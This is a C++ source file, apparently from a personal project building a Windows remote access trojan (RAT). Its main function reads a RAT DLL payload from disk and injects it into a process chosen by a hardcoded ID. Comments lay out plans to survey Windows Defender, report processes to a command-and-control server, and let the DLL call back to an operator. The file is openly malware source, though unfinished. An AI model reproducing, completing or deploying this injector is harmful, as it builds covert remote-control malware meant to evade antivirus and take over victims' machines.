// Patrick Sacchet
// Version 1.0
// RAT-Exe-Main.cpp : This file contains the 'main' function. Program execution begins and ends there.

#include "RAT-Exe-Main.h"
#include "RAT-Exe-Injection.h"


INT main()
{
    INT status = ERROR_SUCCESS;
    HANDLE hFile;
    DWORD dwBytesRead = 0;
    CHAR msgBuf[MAX_BUFFER_SIZE], *fileContents = NULL, *fileBytes = NULL;
    LARGE_INTEGER fileSize;
    LPCSTR filePath = "C:\\Users\\Admin\\Projects\\Personal\\Windows-RAT\\RAT-Dll\\x64\\Debug\\RAT-Dll.dll";
    DWORD lastError, bufferSize;
    LPCWSTR dllName = DLL_NAME;
    HMODULE hGetProcIDLL = LoadLibrary(dllName);

    OutputDebugStringA("RAT-Exe-Main::main - Initializing program...\n");

    // First we survey the system, paying particualr attention to Windows Defender specifics 
    // TODO: Windows Defender call

    // First, parse processes on the system we can see to inject our DLL into; send these back to our C2 to see which to inject into

    // Read in payload; get size
    
    hFile = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        OutputDebugStringA("RAT-Exe-Main::main - Failure from CreateFileA (INVALID_HANDLE_VALUE)");
        status = FAILURE;
        goto cleanup;
    }

    // Get file details first prior to reading it so we can get the whole size of the file 
    if (!GetFileSizeEx(hFile, &fileSize))
    {
        sprintf_s(msgBuf, "RAT-Exe-Main::main - Failure from GetFileSizeEx %d\n", GetLastError());
        OutputDebugStringA(msgBuf);
        status = GetLastError();
        goto cleanup;
    }

    // Allocate for our file buffer
    fileContents = (char*)malloc(fileSize.QuadPart * sizeof(char));
    if (fileContents == NULL)
    {
        OutputDebugStringA("RAT-Exe-Main::main - Failure from malloc (NOT ENOUGH MEMORY)");
        status = FAILURE;
        goto cleanup;
    }

    // These data sizes dont technically match up so fix this later...
    bufferSize = fileSize.QuadPart;

    sprintf_s(msgBuf, "RAT-Exe-Main::main - Size of buffer we're grabbing: %d\n", bufferSize);
    OutputDebugStringA(msgBuf);

    // Now note the size and read the file 
    if (!ReadFile(hFile, fileContents, fileSize.QuadPart, &dwBytesRead, NULL))
    {
        sprintf_s(msgBuf, "RAT-Exe-Main::main - Failure from ReadFile %d\n", GetLastError());
        OutputDebugStringA(msgBuf);
        status = GetLastError();
        goto cleanup;
    }

    fileBytes = fileContents;

    // Normal Windows app will close the handle to the file
    if (!CloseHandle(hFile))
    {
        printf_s(msgBuf, "RAT-Dll-GetFile::performGetFile - Failure from CloseHandle %d\n", GetLastError());
        OutputDebugStringA(msgBuf);
        status = GetLastError();
        goto cleanup;
    }
     
    
    // lets just test inject first to get that working 
        // paint inject test 
    status = inject(24512, bufferSize, fileBytes);
    if (status != ERROR_SUCCESS)
    {
        printf_s(msgBuf, "RAT-Exe::main - Failure from inject %d\n", status);
        OutputDebugStringA(msgBuf);
        goto cleanup;
    }
    else
    {
        OutputDebugStringA("RAT-Exe::main - Successfully injected payload\n");
    }




    // If we are in a 'operational' space load our DLL into memory so it can call back to our client 
    

    /*/if (!hGetProcIDLL)
    {
        // why do we end up here 
        OutputDebugStringA("RAT-Exe-Main.cpp::main - Could not successfully load target DLL\n");
        lastError = GetLastError();
        sprintf_s(msgBuf, "RAT-Exe-Main::main - Last error: %08x) \n", lastError);
        OutputDebugStringA(msgBuf);
        return FAILURE;
    }

    OutputDebugStringA("RAT-Exe.cpp-Main::main - Successfully loaded target DLL\n");

    // Grab proc address to call into 
    typedef UINT (WINAPI* DLLFUNCPOINT) (HMODULE,DWORD,LPVOID);
    DLLFUNCPOINT DllFuncPoint;
    DllFuncPoint = (DLLFUNCPOINT)GetProcAddress(hGetProcIDLL, "DllMain");
    if (!DllFuncPoint)
    {
        printf("Failed to get function pointer in DLL!\n");
        FreeLibrary(hGetProcIDLL);
        return FAILURE;
    }

    else
    {
        UINT returnValue = 0;
        returnValue = DllFuncPoint(hGetProcIDLL, DLL_PROCESS_ATTACH, NULL);

        if (!returnValue)
        {
            OutputDebugStringA("RAT-Exe-Main.cpp::main - Call to DLL main failed \n");
            return FAILURE;
        }

        else
        {
            OutputDebugStringA("RAT-Exe-Main.cpp::main - Call to DLL main was successful! \n");
            FreeLibrary(hGetProcIDLL);
            return SUCCESS;
        }
    }
    */

    // While our DLL handles commands from client continue to survey the system, calling DLL_PROCESS_DETACH once we suspect a threat
    // TODO: Implement further antivirus monitoring 
cleanup:
    return SUCCESS;
}


